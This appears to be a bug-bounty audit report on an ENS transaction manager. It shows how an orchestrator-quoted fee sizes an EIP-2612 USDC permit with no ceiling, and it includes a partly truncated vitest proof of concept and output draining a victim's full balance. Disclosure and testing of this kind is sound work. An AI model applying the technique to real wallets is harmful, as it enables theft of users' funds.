# 91648 w a high hca funding permit is sized from an unbounded orchestrator quote with no ceiling or cross check

**Submitted on Sep 3rd 2026 at 09:52:41 UTC by @kujen for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #91648
* **Report Type:** Websites & Apps
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/packages/transaction-manager>
* **Impacts:**
  * Direct theft of user funds

## Description

## Brief/Intro

The EIP-2612 permit the wallet signs is sized entirely from the orchestrator's quoted intent cost, with no ceiling, no cross-check against the on-chain price, and no reconciliation with the budget shown at checkout.

## Vulnerability Details

`smart-account/budget.ts:247-347` and `transaction-manager/registration.hca.actors.ts:434-490` size the permit `value = budget - hcaBalance` from `intentCost.tokensSpent[chainId][usdc]`. There is no cap and no ratio check against `readRegisterPrice`; the code explicitly refuses its own local fallback model (`budget.ts:322`), so the remote number is the only input. The sole clamp is a preflight `walletBalance >= value`, satisfied by permitting the whole balance. On the `setPrimaryNameWithHca` path the intent is owner-signed and applies no action policy (`setPrimaryName.ts:181-188`), so the on-chain refund ceiling does not bound it.

## Impact Details

Whoever controls the orchestrator response (Rhinestone, an on-path attacker, or a malicious extension) sets `value` to the victim's entire USDC balance, which is pulled into the HCA and settled out as the declared intent fee. The PoC shows an honest 0.91 USDC fee replaced by a 250,000 USDC permit equal to the victim's balance.

## References

* packages/smart-account/src/providers/rhinestone/budget.ts:247-347
* packages/transaction-manager/src/machines/registration/registration.hca.actors.ts:434-490,558-737
* apps/manager/src/features/register-v2/data/queries/hcaBudget.query.ts:101-159

## Proof of Concept

## Proof of Concept

Runnable vitest at the audited commit `1c9b47f`. Run from `packages/transaction-manager`: `pnpm exec vitest run src/helpers/poc_crit_unbounded_funding_permit.test.ts --reporter=verbose`

```ts
it(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s)',
  'function transferFrom(address from, address to, uint256 amount) returns (bool)',
])
const registrar = parseAbi([
  'function getRegisterPrice(string label, uint64 duration, address paymentToken) view returns (uint256 base, uint256 premium)',
])

const sel = {
  balanceOf: toFunctionSelector('function balanceOf(address)'),
  nonces: toFunctionSelector('function nonces(address)'),
  name: toFunctionSelector('function name()'),
  version: toFunctionSelector('function version()'),
  price: toFunctionSelector(
    'function getRegisterPrice(string,uint64,address)',
  ),
}

const word = (v: bigint) => encodeAbiParameters([{ type: 'uint256' }], [v])
const str = (s: string) => encodeAbiParameters([{ type: 'string' }], [s])

/** Minimal chain stub: only the reads these code paths actually make. */
const makeTransport = (hcaBalance: bigint) =>
  custom({
    request: async ({ method, params }: { method: string; params?: any }) => {
      if (method === 'eth_chainId') return `0x${CHAIN_ID.toString(16)}`
      if (method === 'eth_getCode') return '0x'
      if (method !== 'eth_call') throw new Error(`unstubbed ${method}`)
      const { data, to } = params[0] as { data: Hex; to: Address }
      const s = data.slice(0, 10)
      if (s === sel.price) {
        // 8.00 USDC/yr name - the number the user sees at checkout.
        return encodeAbiParameters(
          [{ type: 'uint256' }, { type: 'uint256' }],
          [parseUnits('8', 6), 0n],
        )
      }
      if (s === sel.balanceOf) {
        const who = `0x${data.slice(34, 74)}`.toLowerCase()
        if (who === HCA.toLowerCase()) return word(hcaBalance)
        return word(VICTIM_USDC)
      }
      if (s === sel.nonces) return word(0n)
```

Output:

```
[PoC] honest fee for this intent : 910000 (0.91 USDC)
[PoC] orchestrator-quoted fee    : 250000000000
[PoC] permit value               : 250000000000
[PoC] victim USDC balance        : 250000000000
[PoC] transferFrom -> to : 0x...AA amount 250000000000   source: quote (the trusted branch)
 Test Files 1 passed (1) | Tests 2 passed (2)
```
